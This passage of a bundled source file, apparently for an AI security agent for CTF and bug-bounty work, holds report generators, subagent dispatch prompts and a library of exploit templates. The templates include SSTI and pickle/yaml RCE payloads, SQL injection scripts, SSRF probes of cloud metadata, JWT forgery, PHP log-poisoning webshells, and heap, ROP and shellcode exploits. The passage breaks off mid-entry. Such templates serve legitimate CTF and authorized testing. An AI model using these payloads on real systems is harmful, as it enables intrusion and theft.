    if (candidate && !/^https?:\/\//i.test(candidate)) {
      artifacts.add(candidate);
    }
  }
  return Array.from(artifacts);
}
function isEntryBoundary(line) {
  return /^#{2,6}\s+/.test(line) || /^[-*]\s+/.test(line) || /^\d+\.\s+/.test(line);
}
function finalizeEvidenceBlock(blockLines) {
  const cleaned = blockLines.map((line) => trimLine(line)).filter(Boolean);
  if (cleaned.length === 0) {
    return null;
  }
  const firstLine = stripHeadingPrefix(stripListPrefix(cleaned[0]));
  const item = firstLine || "Evidence item";
  const verificationLine = cleaned.map((line) => stripHeadingPrefix(stripListPrefix(line))).find((line) => /\b(verified|verification|status|result|accepted|correct|impact|severity)\b/i.test(line)) ?? cleaned[1] ?? "Verification details not specified.";
  return {
    item,
    verification: stripHeadingPrefix(stripListPrefix(verificationLine)),
    artifacts: extractArtifactPaths(cleaned.join(`
`))
  };
}
function buildReport(mode, title, sections) {
  const generatedAt = Date.now();
  const draft = {
    mode,
    title,
    sections,
    generatedAt,
    markdown: ""
  };
  return {
    ...draft,
    markdown: formatReportMarkdown(draft)
  };
}
function renderWorklogEntries(entries, emptyFallback) {
  if (entries.length === 0) {
    return emptyFallback;
  }
  return entries.map((entry, index) => `${index + 1}. [${entry.timestamp}] ${entry.action} -> ${entry.result}`).join(`
`);
}
function renderEvidenceEntries(entries, emptyFallback) {
  if (entries.length === 0) {
    return emptyFallback;
  }
  return entries.map((entry) => {
    const artifactSuffix = entry.artifacts.length > 0 ? ` | artifacts: ${entry.artifacts.join(", ")}` : "";
    return `- ${entry.item}: ${entry.verification}${artifactSuffix}`;
  }).join(`
`);
}
function inferFlag(optionsFlag, evidenceContent) {
  const explicit = optionsFlag?.trim();
  if (explicit) {
    return explicit;
  }
  const detected = evidenceContent.match(/(?:flag\{|CTF\{|FLAG\{)[^\s}]+\}/);
  return detected?.[0] ?? "Not provided";
}
function parseWorklog(content) {
  const lines = content.replace(/\r/g, "").split(`
`);
  const entries = [];
  let currentTimestamp = "unknown";
  for (const rawLine of lines) {
    const cleaned = stripHeadingPrefix(stripListPrefix(trimLine(rawLine)));
    if (!cleaned) {
      continue;
    }
    const timestampParsed = extractTimestamp(cleaned);
    if (timestampParsed.timestamp) {
      currentTimestamp = timestampParsed.timestamp;
    }
    const body = (timestampParsed.rest || cleaned).trim();
    if (!body) {
      continue;
    }
    if (/^(goal|next\s*todo|todo|phase|lh|candidate|verified)\s*:/i.test(body)) {
      continue;
    }
    const split = splitActionResult(body);
    entries.push({
      timestamp: currentTimestamp,
      action: split.action,
      result: split.result
    });
  }
  return entries;
}
function parseEvidence(content) {
  const lines = content.replace(/\r/g, "").split(`
`);
  const blocks = [];
  let currentBlock = [];
  for (const rawLine of lines) {
    const trimmed = trimLine(rawLine);
    if (!trimmed) {
      if (currentBlock.length > 0) {
        blocks.push(currentBlock);
        currentBlock = [];
      }
      continue;
    }
    if (isEntryBoundary(trimmed) && currentBlock.length > 0) {
      blocks.push(currentBlock);
      currentBlock = [trimmed];
    } else {
      currentBlock.push(trimmed);
    }
  }
  if (currentBlock.length > 0) {
    blocks.push(currentBlock);
  }
  if (blocks.length === 0 && content.trim()) {
    blocks.push(content.replace(/\r/g, "").split(`
`).map((line) => trimLine(line)).filter(Boolean));
  }
  const entries = [];
  for (const block of blocks) {
    const parsed = finalizeEvidenceBlock(block);
    if (parsed) {
      entries.push(parsed);
    }
  }
  return entries;
}
function generateCtfWriteup(worklogContent, evidenceContent, options) {
  const worklogEntries = parseWorklog(worklogContent);
  const evidenceEntries = parseEvidence(evidenceContent);
  const challengeName = options?.challengeName?.trim() || "CTF Challenge";
  const category = options?.category?.trim() || "Unknown";
  const finalFlag = inferFlag(options?.flag, evidenceContent);
  const sectionArtifacts = Array.from(new Set(evidenceEntries.flatMap((entry) => entry.artifacts)));
  const sections = [
    {
      title: "Challenge Overview",
      content: [
        `- Challenge: ${challengeName}`,
        `- Category: ${category}`,
        "- Mode: CTF",
        `- Worklog Entries: ${worklogEntries.length}`,
        `- Evidence Items: ${evidenceEntries.length}`
      ].join(`
`)
    },
    {
      title: "Methodology",
      content: renderWorklogEntries(worklogEntries, "No structured worklog entries were found.")
    },
    {
      title: "Verification Evidence",
      content: renderEvidenceEntries(evidenceEntries, "No verification evidence entries were found."),
      artifacts: sectionArtifacts
    },
    {
      title: "Final Flag",
      content: `- ${finalFlag}`
    }
  ];
  return buildReport("CTF", `${challengeName} Writeup`, sections);
}
function generateBountyReport(worklogContent, evidenceContent, options) {
  const worklogEntries = parseWorklog(worklogContent);
  const evidenceEntries = parseEvidence(evidenceContent);
  const programName = options?.programName?.trim() || "Target Program";
  const severity = options?.severity?.trim() || "Unspecified";
  const endpoint = options?.endpoint?.trim() || "Not specified";
  const artifacts = Array.from(new Set(evidenceEntries.flatMap((entry) => entry.artifacts)));
  const sections = [
    {
      title: "Executive Summary",
      content: [
        `- Program: ${programName}`,
        `- Reported Severity: ${severity}`,
        `- Affected Endpoint: ${endpoint}`,
        "- Mode: BOUNTY"
      ].join(`
`)
    },
    {
      title: "Steps to Reproduce",
      content: renderWorklogEntries(worklogEntries, "No reproducible steps were parsed from WORKLOG.")
    },
    {
      title: "Observed Evidence",
      content: renderEvidenceEntries(evidenceEntries, "No structured evidence entries were parsed from EVIDENCE."),
      artifacts
    },
    {
      title: "Impact",
      content: [
        `- Claimed Severity: ${severity}`,
        "- Validate business impact with explicit authorization and reproducible minimal-impact proof."
      ].join(`
`)
    },
    {
      title: "Remediation",
      content: [
        "1. Reproduce the issue in a controlled environment using the listed steps.",
        "2. Apply the least-privilege and input-validation control relevant to the root cause.",
        "3. Re-run the validation evidence checks and confirm the issue no longer reproduces."
      ].join(`
`)
    }
  ];
  return buildReport("BOUNTY", `${programName} Security Report`, sections);
}
function generateReport(mode, worklogContent, evidenceContent, options) {
  if (mode === "CTF") {
    return generateCtfWriteup(worklogContent, evidenceContent, {
      challengeName: options?.challengeName,
      category: options?.category,
      flag: options?.flag
    });
  }
  return generateBountyReport(worklogContent, evidenceContent, {
    programName: options?.programName,
    severity: options?.severity,
    endpoint: options?.endpoint
  });
}
function formatReportMarkdown(report) {
  const lines = [
    `# ${report.title}`,
    "",
    `- Mode: ${report.mode}`,
    `- Generated At: ${new Date(report.generatedAt).toISOString()}`,
    ""
  ];
  for (const section of report.sections) {
    lines.push(`## ${section.title}`);
    lines.push("");
    lines.push(section.content.trim() || "No content provided.");
    if (section.artifacts && section.artifacts.length > 0) {
      lines.push("");
      lines.push("Artifacts:");
      for (const artifact of section.artifacts) {
        lines.push(`- \`${artifact}\``);
      }
    }
    lines.push("");
  }
  return lines.join(`
`).trimEnd() + `
`;
}

// src/orchestration/subagent-dispatch.ts
var MAX_TRACKS_HARD_CAP = 6;
var DEFAULT_EXPLORE_TRACKS = 3;
var DEFAULT_LIBRARIAN_TRACKS = 3;
var LIBRARIAN_HINTS = [
  "cve",
  "cwe",
  "nvd",
  "mitre",
  "advisory",
  "writeup",
  "documentation",
  "docs",
  "api",
  "reference",
  "github",
  "repo",
  "framework",
  "library",
  "exploit-db"
];
var EXPLORE_HINTS = [
  "file",
  "files",
  "source",
  "code",
  "codebase",
  "binary",
  "elf",
  "pcap",
  "trace",
  "function",
  "handler",
  "controller",
  "endpoint",
  "grep",
  "glob",
  "ast",
  "line",
  "sink",
  "challenge",
  "artifact"
];
function clampMaxTracks(value, fallback) {
  if (typeof value !== "number" || Number.isNaN(value) || value <= 0) {
    return fallback;
  }
  return Math.min(Math.floor(value), MAX_TRACKS_HARD_CAP);
}
function cleanList(values) {
  if (!values || values.length === 0) {
    return [];
  }
  const dedup = new Set;
  for (const raw of values) {
    const value = raw.trim();
    if (!value) {
      continue;
    }
    dedup.add(value);
  }
  return [...dedup];
}
function compactQuery(query, fallback) {
  const trimmed = query.trim();
  return trimmed ? trimmed : fallback;
}
function safeLabel(input) {
  const normalized = input.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "");
  return normalized || "query";
}
function withPromptContract2(uniqueFocus, doNotCover, body) {
  return [`UniqueFocus: ${uniqueFocus}`, `DoNotCover: ${doNotCover}`, ...body].join(`
`);
}
function countHints(haystack, needles) {
  let score = 0;
  for (const hint of needles) {
    if (haystack.includes(hint)) {
      score += 1;
    }
  }
  return score;
}
function detectSearchTypes(query) {
  const q = query.toLowerCase();
  const selected = new Set;
  if (q.includes("cve") || q.includes("cwe") || q.includes("advisory") || q.includes("nvd")) {
    selected.add("cve");
  }
  if (q.includes("writeup") || q.includes("ctf") || q.includes("walkthrough")) {
    selected.add("writeup");
  }
  if (q.includes("docs") || q.includes("documentation") || q.includes("api") || q.includes("framework")) {
    selected.add("docs");
  }
  if (q.includes("github") || q.includes("repo") || q.includes("source")) {
    selected.add("github");
  }
  if (selected.size === 0) {
    return ["cve", "writeup", "docs"];
  }
  return [...selected];
}
function buildExploreTracks(state, query, focusAreas) {
  const modeHint = state.mode === "CTF" ? "CTF mode: challenge-centric artifact and binary/code attack-surface discovery." : "BOUNTY mode: codebase-centric vulnerability pattern review with minimal-impact assumptions.";
  const focusHint = focusAreas.length > 0 ? `Prioritize these focus areas: ${focusAreas.join(", ")}.` : "Prioritize likely hot spots: inputs, trust boundaries, auth/session, parsing, deserialization, command/file/network sinks.";
  return [
    {
      purpose: "aegis-explore-surface-map",
      agent: "aegis-explore",
      prompt: withPromptContract2("surface map: file list, entrypoints, protections, top hotspots", "Do not cover aegis-explore-vuln-patterns (vuln-patterns) or aegis-explore-evidence-cut (evidence-cut); forbid deep sink analysis and ranking/triage summarization.", [
        "[Aegis Subagent Dispatch: Explore / Surface Map]",
        `Query: ${query}`,
        modeHint,
        focusHint,
        "Use grep/glob/read/ast_grep_search to map attack surface quickly.",
        "Output <=20 bullet lines with file:line references."
      ])
    },
    {
      purpose: "aegis-explore-vuln-patterns",
      agent: "aegis-explore",
      prompt: withPromptContract2("security patterns: sinks, trust boundaries, validation/authz/authn issues", "Do not cover aegis-explore-surface-map (surface-map) or aegis-explore-evidence-cut (evidence-cut); forbid broad inventory and ranking/triage summarization.", [
        "[Aegis Subagent Dispatch: Explore / Vulnerability Patterns]",
        `Query: ${query}`,
        "Search for security-relevant patterns: weak validation, trust-boundary gaps, dangerous sinks, parser misuse, crypto misuse, authz/authn mistakes.",
        "Use targeted grep and AST pattern search only.",
        "Output <=20 bullet lines with file:line references."
      ])
    },
    {
      purpose: "aegis-explore-evidence-cut",
      agent: "aegis-explore",
      prompt: withPromptContract2("evidence cut: dedupe + rank findings by exploitability/confidence + top 5", "Do not cover aegis-explore-surface-map (surface-map) or aegis-explore-vuln-patterns (vuln-patterns); forbid new searching and only synthesize existing findings.", [
        "[Aegis Subagent Dispatch: Explore / Evidence Cut]",
        `Query: ${query}`,
        "Collect the highest-signal findings only and reduce noise.",
        "Rank findings by exploitability and confidence.",
        "Output <=20 bullet lines with file:line references."
      ])
    }
  ];
}
function buildLibrarianPrompt(type, query) {
  if (type === "cve") {
    return withPromptContract2("cve intelligence: CVEs, advisories, and applicability to the query", "Do not cover writeup/docs/github librarian tracks; do not perform local code exploration.", [
      "[Aegis Subagent Dispatch: Librarian / CVE Intelligence]",
      `Query: ${query}`,
      "Find CVEs/advisories relevant to this query.",
      "Prefer NVD, vendor advisories, and high-quality writeups.",
      "Return 3-5 references with URL and 1-2 line applicability summary."
    ]);
  }
  if (type === "writeup") {
    return withPromptContract2("writeup intelligence: similar incident/CTF writeups with actionable methods", "Do not cover cve/docs/github librarian tracks; do not perform local code exploration.", [
      "[Aegis Subagent Dispatch: Librarian / Similar Writeups]",
      `Query: ${query}`,
      "Find similar CTF or real-world incident writeups with actionable exploitation notes.",
      "Prioritize high-signal methodology and reproducible steps.",
      "Return 3-5 references with URL and 1-2 line applicability summary."
    ]);
  }
  if (type === "docs") {
    return withPromptContract2("documentation intelligence: official docs and version-specific security guidance", "Do not cover cve/writeup/github librarian tracks; do not perform local code exploration.", [
      "[Aegis Subagent Dispatch: Librarian / Official Documentation]",
      `Query: ${query}`,
      "Find official docs and security guidance for frameworks, APIs, libraries, and configurations involved.",
      "Prefer primary documentation and version-specific guidance.",
      "Return 3-5 references with URL and 1-2 line applicability summary."
    ]);
  }
  return withPromptContract2("github intelligence: OSS examples, issues, and security discussions", "Do not cover cve/writeup/docs librarian tracks; do not perform local code exploration.", [
    "[Aegis Subagent Dispatch: Librarian / GitHub Examples]",
    `Query: ${query}`,
    "Find relevant OSS code examples and security discussions in GitHub repositories/issues.",
    "Prioritize patterns that map to likely exploitation or validation techniques.",
    "Return 3-5 references with URL and 1-2 line applicability summary."
  ]);
}
function buildLibrarianTracks(searchTypes, query) {
  return searchTypes.map((searchType) => ({
    purpose: `aegis-librarian-${searchType}`,
    agent: "aegis-librarian",
    prompt: buildLibrarianPrompt(searchType, query)
  }));
}
function planExploreDispatch(state, query, options) {
  const normalizedQuery = compactQuery(query, "targeted attack-surface exploration");
  const focusAreas = cleanList(options?.focusAreas);
  const maxTracks = clampMaxTracks(options?.maxTracks, DEFAULT_EXPLORE_TRACKS);
  const tracks = buildExploreTracks(state, normalizedQuery, focusAreas).slice(0, maxTracks);
  return {
    label: `aegis-explore-${safeLabel(normalizedQuery)}`,
    tracks
  };
}
function planLibrarianDispatch(state, query, options) {
  const normalizedQuery = compactQuery(query, "security reference lookup");
  const maxTracks = clampMaxTracks(options?.maxTracks, DEFAULT_LIBRARIAN_TRACKS);
  const requestedTypes = cleanList(options?.searchTypes);
  const searchTypes = requestedTypes.length > 0 ? requestedTypes : detectSearchTypes(`${state.mode} ${normalizedQuery}`);
  const tracks = buildLibrarianTracks(searchTypes, normalizedQuery).slice(0, maxTracks);
  return {
    label: `aegis-librarian-${safeLabel(normalizedQuery)}`,
    tracks
  };
}
function detectSubagentType(query) {
  const normalized = query.toLowerCase();
  if (normalized.includes("cve") || normalized.includes("docs") || normalized.includes("api")) {
    return "librarian";
  }
  if (normalized.includes("file") || normalized.includes("code") || normalized.includes("binary")) {
    return "explore";
  }
  const librarianScore = countHints(normalized, LIBRARIAN_HINTS);
  const exploreScore = countHints(normalized, EXPLORE_HINTS);
  if (librarianScore > exploreScore) {
    return "librarian";
  }
  return "explore";
}

// src/orchestration/exploit-templates.ts
var TEMPLATES = [
  {
    domain: "PWN",
    id: "pwntools-skeleton",
    title: "Pwntools exploit skeleton (local/remote)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "context.log_level = 'info'",
      "",
      "HOST = '127.0.0.1'",
      "PORT = 1337",
      "",
      "def start(argv=[]):",
      "    if args.REMOTE:",
      "        return remote(HOST, PORT)",
      "    return process([elf.path] + argv)",
      "",
      "io = start()",
      "",
      "# TODO: trigger bug, get primitive (leak/write/control)",
      "# TODO: build payload",
      "",
      "io.interactive()",
      "```",
      "",
      "Run:",
      "- local: python3 exp.py",
      "- remote: python3 exp.py REMOTE"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "ret2libc-outline",
    title: "ret2libc outline (leak -> libc base -> system)",
    body: [
      "```text",
      "1) Leak a libc address (puts/printf/read/write) via GOT or stack.",
      "2) Compute libc_base = leaked - libc.symbols[<fn>].",
      "3) system = libc_base + libc.symbols['system'].",
      "4) binsh = libc_base + next(libc.search(b'/bin/sh\\x00')).",
      "5) Build ROP: ret (stack align if needed) -> system(binsh).",
      "6) Verify deterministically: repeat run, then remote parity.",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "padding-oracle-loop",
    title: "Padding oracle loop skeleton (bytewise)",
    body: [
      "```python",
      "# Skeleton: adapt to your oracle and block mode.",
      "# Goal: recover plaintext or forge a valid ciphertext using a padding oracle.",
      "",
      "def oracle(ciphertext: bytes) -> bool:",
      '    """Return True iff padding is valid (or error differs)."""',
      "    raise NotImplementedError",
      "",
      "def split_blocks(data: bytes, bs: int) -> list[bytes]:",
      "    return [data[i:i+bs] for i in range(0, len(data), bs)]",
      "",
      "# TODO: implement bytewise attack for your protocol",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "ecb-byte-at-a-time",
    title: "ECB byte-at-a-time outline (oracle)",
    body: [
      "```text",
      "1) Confirm ECB: identical blocks => identical ciphertext blocks.",
      "2) Find block size by measuring ciphertext length steps.",
      "3) For each unknown byte: craft prefix so next unknown byte aligns at block end.",
      "4) Build dictionary of 256 candidates; match oracle output block.",
      "5) Stop-loss: if mismatch, re-check padding/encoding/normalization assumptions.",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "format-string-leak",
    title: "Format string leak + write skeleton (%p / %n)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "HOST, PORT = '127.0.0.1', 1337",
      "",
      "def start():",
      "    return remote(HOST, PORT) if args.REMOTE else process(elf.path)",
      "",
      "def leak_stack(io):",
      "    # TODO: adjust menu prompt and count of leaked slots",
      "    io.sendlineafter(b'> ', b'%p|' * 16)",
      "    line = io.recvline(timeout=2) or b''",
      "    leaks = [x for x in line.strip().split(b'|') if x.startswith(b'0x')]",
      "    return leaks",
      "",
      "def fsb_write_payload(where: int, value: int, offset: int) -> bytes:",
      "    # TODO: adapt byte/short/int write strategy for target",
      "    return fmtstr_payload(offset, {where: value}, write_size='short')",
      "",
      "io = start()",
      "leaks = leak_stack(io)",
      "# TODO: parse PIE/libc/canary from leaks and compute target addr",
      "# payload = fsb_write_payload(target_addr, target_value, offset=6)",
      "# io.sendlineafter(b'> ', payload)",
      "io.interactive()",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "heap-tcache-poison",
    title: "Heap tcache poisoning (double-free -> arbitrary write)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "",
      "def alloc(io, idx: int, size: int, data: bytes):",
      "    io.sendlineafter(b'> ', b'1')",
      "    io.sendlineafter(b'idx: ', str(idx).encode())",
      "    io.sendlineafter(b'size: ', str(size).encode())",
      "    io.sendafter(b'data: ', data)",
      "",
      "def free(io, idx: int):",
      "    io.sendlineafter(b'> ', b'2')",
      "    io.sendlineafter(b'idx: ', str(idx).encode())",
      "",
      "def edit(io, idx: int, data: bytes):",
      "    io.sendlineafter(b'> ', b'3')",
      "    io.sendlineafter(b'idx: ', str(idx).encode())",
      "    io.sendafter(b'data: ', data)",
      "",
      "io = process(elf.path)",
      "",
      "# 1) Fill tcache bin and create double-free primitive",
      "alloc(io, 0, 0x60, b'A' * 8)",
      "alloc(io, 1, 0x60, b'B' * 8)",
      "free(io, 0)",
      "free(io, 1)",
      "free(io, 0)  # double free",
      "",
      "# 2) Poison fd pointer to target-0x10 (glibc version dependent)",
      "target = elf.got.get('free', 0)",
      "edit(io, 0, p64(target))",
      "",
      "# 3) Allocate chunks to land controlled pointer at target",
      "alloc(io, 2, 0x60, b'C' * 8)",
      "alloc(io, 3, 0x60, b'D' * 8)",
      "alloc(io, 4, 0x60, p64(elf.symbols.get('win', 0)))",
      "",
      "# TODO: trigger hijacked function pointer/hook",
      "io.interactive()",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "rop-chain-builder",
    title: "ROP chain builder with gadget placeholders",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "rop = ROP(elf)",
      "offset =  cyclic_find(0x6161616c)  # TODO: replace with real crash value",
      "",
      "# TODO: replace with discovered gadgets from ROPgadget/ropper",
      "pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]",
      "ret = rop.find_gadget(['ret'])[0]",
      "",
      "payload = flat(",
      "    b'A' * offset,",
      "    ret,  # stack alignment for libc calls",
      "    pop_rdi,",
      "    next(elf.search(b'/bin/sh\\x00')),  # or libc search after leak",
      "    elf.plt.get('system', 0),",
      ")",
      "",
      "# TODO: send payload through vulnerable input path",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "srop-sigreturn",
    title: "SROP sigreturn frame template (execve/orw)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.arch = 'amd64'",
      "context.binary = elf = ELF('./chall')",
      "",
      "io = process(elf.path)",
      "",
      "syscall_ret = 0x0  # TODO: gadget: syscall; ret",
      "pop_rax = 0x0      # TODO: gadget: pop rax; ret",
      "binsh = 0x0        # TODO: writable addr containing b'/bin/sh\\x00'",
      "",
      "frame = SigreturnFrame()",
      "frame.rax = 59   # execve",
      "frame.rdi = binsh",
      "frame.rsi = 0",
      "frame.rdx = 0",
      "frame.rip = syscall_ret",
      "",
      "payload = flat(",
      "    b'A' * 0x100,  # TODO: overflow offset",
      "    pop_rax,",
      "    15,            # rt_sigreturn syscall number",
      "    syscall_ret,",
      "    bytes(frame),",
      ")",
      "",
      "io.send(payload)",
      "io.interactive()",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "ret2dlresolve",
    title: "ret2dlresolve template (arbitrary resolver call)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "io = process(elf.path)",
      "rop = ROP(elf)",
      "offset = 0x100  # TODO: overflow offset",
      "",
      "dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])",
      "bss_addr = elf.bss() + 0x800",
      "",
      "# Stage 1: read fake structures into memory",
      "rop.read(0, bss_addr, len(dl.payload))",
      "rop.ret2dlresolve(dl, bss_addr)",
      "",
      "payload = flat({offset: rop.chain()})",
      "io.send(payload)",
      "io.send(dl.payload)",
      "io.interactive()",
      "```"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "seccomp-bypass-orw",
    title: "seccomp bypass via ORW shellcode (open/read/write)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.arch = 'amd64'",
      "context.binary = elf = ELF('./chall')",
      "io = process(elf.path)",
      "",
      "flag_path = b'/flag\\x00'",
      "",
      "sc = asm(f'''",
      "    mov rax, 2                /* open */",
      "    lea rdi, [rip+path]",
      "    xor rsi, rsi",
      "    xor rdx, rdx",
      "    syscall",
      "    mov rdi, rax              /* fd */",
      "    mov rax, 0                /* read */",
      "    mov rsi, rsp",
      "    mov rdx, 0x100",
      "    syscall",
      "    mov rdx, rax              /* nbytes */",
      "    mov rax, 1                /* write */",
      "    mov rdi, 1",
      "    mov rsi, rsp",
      "    syscall",
      "    jmp done",
      "path:",
      '    .ascii "/flag\\x00"',
      "done:",
      "''')",
      "",
      "# TODO: use RWX region, mprotect, or stack pivot to run shellcode",
      "io.send(sc)",
      "io.interactive()",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "ssti-jinja2",
    title: "Jinja2 SSTI probe and RCE payload workflow",
    body: [
      "```python",
      "import requests",
      "",
      "URL = 'http://target/render'",
      "PARAM = 'name'",
      "",
      "probes = [",
      "    '{{7*7}}',",
      "    '{{config.items()}}',",
      `    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"`,
      "]",
      "",
      "for p in probes:",
      "    r = requests.get(URL, params={PARAM: p}, timeout=8)",
      "    print('payload=', p)",
      "    print('status=', r.status_code)",
      "    print('body[:200]=', r.text[:200])",
      "    print('-' * 40)",
      "",
      "# TODO: adapt context variable path (config/request/self) to app version",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB3",
    id: "web3-reentrancy-checklist",
    title: "WEB3 reentrancy triage and minimal PoC checklist",
    body: [
      "```text",
      "1) Identify external-call-before-state-update patterns (call/value/send/transfer).",
      "2) Confirm reentry surface (fallback/receive/hook callbacks).",
      "3) Build minimal attacker contract with controlled callback depth.",
      "4) Assert invariants before/after call (balance, totalSupply, debt, shares).",
      "5) Reproduce with fork/local devnet and record deterministic tx trace.",
      "6) Prefer read-only simulation first; escalate only with explicit scope approval.",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB3",
    id: "web3-oracle-manipulation",
    title: "WEB3 oracle manipulation workflow",
    body: [
      "```text",
      "1) Map oracle source path (TWAP/spot/off-chain signer) and update cadence.",
      "2) Measure liquidity depth/slippage around the priced asset pair.",
      "3) Simulate price movement needed to cross protocol threshold.",
      "4) Re-run health checks/liquidation math with manipulated price snapshot.",
      "5) Validate exploitability in forked state with reproducible block context.",
      "6) Record required capital, time window, and mitigation options.",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "sqli-union",
    title: "UNION-based SQLi extraction skeleton",
    body: [
      "```python",
      "import requests",
      "",
      "BASE = 'http://target/products'",
      "PARAM = 'id'",
      "",
      "def send(payload: str):",
      "    return requests.get(BASE, params={PARAM: payload}, timeout=8)",
      "",
      "# 1) Find column count",
      "for i in range(1, 11):",
      '    r = send(f"1 ORDER BY {i}-- -")',
      "    print(i, r.status_code)",
      "",
      "# 2) Identify printable columns",
      'payload = "-1 UNION ALL SELECT 1,2,3,4-- -"  # TODO: adjust column count',
      "r = send(payload)",
      "print(r.text[:300])",
      "",
      "# 3) Extract DB metadata",
      'payload = "-1 UNION ALL SELECT database(),user(),version(),4-- -"',
      "print(send(payload).text[:500])",
      "",
      "# TODO: enumerate tables/columns for target DB flavor",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "sqli-blind-boolean",
    title: "Boolean-based blind SQLi script template",
    body: [
      "```python",
      "import requests",
      "import string",
      "",
      "URL = 'http://target/item'",
      "PARAM = 'id'",
      "TRUE_MARKER = 'Welcome'  # TODO: marker that appears only on true",
      "",
      "def is_true(condition: str) -> bool:",
      `    payload = f"1' AND ({condition})-- -"`,
      "    r = requests.get(URL, params={PARAM: payload}, timeout=8)",
      "    return TRUE_MARKER in r.text",
      "",
      "def extract_value(sql_expr: str, max_len: int = 64) -> str:",
      "    alphabet = string.ascii_letters + string.digits + '_{}-@.:$'",
      "    out = ''",
      "    for pos in range(1, max_len + 1):",
      "        found = False",
      "        for ch in alphabet:",
      `            cond = f"substr(({sql_expr}),{pos},1)='{ch}'"`,
      "            if is_true(cond):",
      "                out += ch",
      "                found = True",
      "                break",
      "        if not found:",
      "            break",
      "    return out",
      "",
      "print(extract_value('select database()'))",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "ssrf-basic",
    title: "Basic SSRF exploitation and bypass checklist",
    body: [
      "```python",
      "import requests",
      "",
      "ENDPOINT = 'http://target/fetch'",
      "PARAM = 'url'",
      "",
      "targets = [",
      "    'http://127.0.0.1:80/',",
      "    'http://localhost/',",
      "    'http://169.254.169.254/latest/meta-data/',",
      "    'http://[::1]/',",
      "    'http://2130706433/',  # 127.0.0.1 as decimal",
      "]",
      "",
      "for t in targets:",
      "    r = requests.get(ENDPOINT, params={PARAM: t}, timeout=8)",
      "    print(t, r.status_code, len(r.text))",
      "",
      "# TODO: try redirects, DNS rebinding, userinfo (@), mixed schemes (gopher/file)",
      "```",
      "",
      "```text",
      "1) Compare response size/status/timing to detect internal access.",
      "2) Probe cloud metadata endpoints and internal admin panels.",
      '3) If URL validation exists, test parser confusion ("http://allowed@127.0.0.1").',
      "4) Pivot to exfiltration: SSRF -> internal token/API key -> privileged action.",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "jwt-forgery",
    title: "JWT forgery (none alg + key confusion) template",
    body: [
      "```python",
      "import base64",
      "import json",
      "import hmac",
      "import hashlib",
      "",
      "def b64u(data: bytes) -> bytes:",
      "    return base64.urlsafe_b64encode(data).rstrip(b'=')",
      "",
      "# Attack 1: alg=none",
      "header_none = b64u(json.dumps({'typ': 'JWT', 'alg': 'none'}).encode())",
      "payload = b64u(json.dumps({'sub': 'admin', 'role': 'admin'}).encode())",
      "token_none = b'.'.join([header_none, payload, b'']).decode()",
      "print('none token:', token_none)",
      "",
      "# Attack 2: HS256 key confusion with exposed RSA public key",
      "public_key = b'-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----\\n'",
      "header_hs = b64u(json.dumps({'typ': 'JWT', 'alg': 'HS256'}).encode())",
      "msg = b'.'.join([header_hs, payload])",
      "sig = hmac.new(public_key, msg, hashlib.sha256).digest()",
      "token_confusion = b'.'.join([header_hs, payload, b64u(sig)]).decode()",
      "print('key-confusion token:', token_confusion)",
      "",
      "# TODO: send token via Authorization: Bearer <token> and verify privilege escalation",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "deserialization-python",
    title: "Python deserialization (pickle/yaml) exploit skeleton",
    body: [
      "```python",
      "import base64",
      "import pickle",
      "import os",
      "",
      "class RCE:",
      "    def __reduce__(self):",
      "        # TODO: replace command with controlled callback/exfil action",
      "        return (os.system, ('id',))",
      "",
      "payload = pickle.dumps(RCE(), protocol=4)",
      "print('pickle_b64=', base64.b64encode(payload).decode())",
      "",
      `yaml_payload = "!!python/object/apply:os.system ['id']"`,
      "print('yaml=', yaml_payload)",
      "",
      "# TODO: deliver payload to vulnerable pickle.loads / yaml.load (unsafe loader)",
      "```"
    ].join(`
`)
  },
  {
    domain: "WEB",
    id: "lfi-to-rce",
    title: "LFI -> RCE via log poisoning/filter chains",
    body: [
      "```python",
      "import requests",
      "",
      "BASE = 'http://target/index.php'",
      "LFI_PARAM = 'page'",
      "",
      "# 1) Poison access log with PHP payload",
      `php_payload = '<?php system($_GET["cmd"]); ?>'`,
      "requests.get(BASE, headers={'User-Agent': php_payload}, timeout=8)",
      "",
      "# 2) Include poisoned log file through LFI",
      "log_paths = [",
      "    '/var/log/apache2/access.log',",
      "    '/var/log/nginx/access.log',",
      "]",
      "",
      "for lp in log_paths:",
      "    r = requests.get(BASE, params={LFI_PARAM: lp, 'cmd': 'id'}, timeout=8)",
      "    if 'uid=' in r.text:",
      "        print('RCE via', lp)",
      "        print(r.text[:300])",
      "",
      "# TODO: if wrappers enabled, test php://filter and data:// for alternative chains",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
